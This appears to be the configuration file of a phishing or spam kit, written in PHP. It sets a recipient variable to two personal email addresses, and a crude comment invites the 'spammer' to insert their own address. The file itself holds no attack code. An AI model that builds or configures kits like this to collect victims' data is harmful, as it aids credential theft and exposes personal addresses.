<?php



//Hey u fucking spammer, put your fucking email here thief. I'm just kidding Lol.

$recipient = "godlybrain@aol.com,ajalamayowa44@yahoo.com "; 


?>